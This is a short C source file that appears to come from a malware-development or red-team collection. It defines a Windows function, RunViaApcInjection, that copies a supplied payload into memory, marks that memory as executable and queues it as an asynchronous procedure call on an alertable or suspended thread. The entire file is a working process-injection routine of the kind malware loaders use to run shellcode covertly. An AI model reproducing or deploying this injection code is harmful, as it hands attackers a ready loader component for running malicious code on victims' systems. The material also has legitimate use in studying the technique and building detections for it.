/*
APC Injection Function

RunViaApcInjection is a function that performs APC Injection and requires 3 arguments:

    hThread - A handle to an alertable or suspended thread.

    pPayload - A pointer to the payload's base address.

    sPayloadSize - The size of the payload.

*/

#include <Windows.h>
#include <stdio.h>

BOOL RunViaApcInjection(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

	PVOID pAddress = NULL;
	DWORD dwOldProtection = NULL;

	
	pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL) {
		printf("\t[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	memcpy(pAddress, pPayload, sPayloadSize);
	

	if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("\t[!] VirtualProtect Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// If hThread is in an alertable state, QueueUserAPC will run the payload directly
	// If hThread is in a suspended state, the payload won't be executed unless the thread is resumed after
	if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {
		printf("\t[!] QueueUserAPC Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}
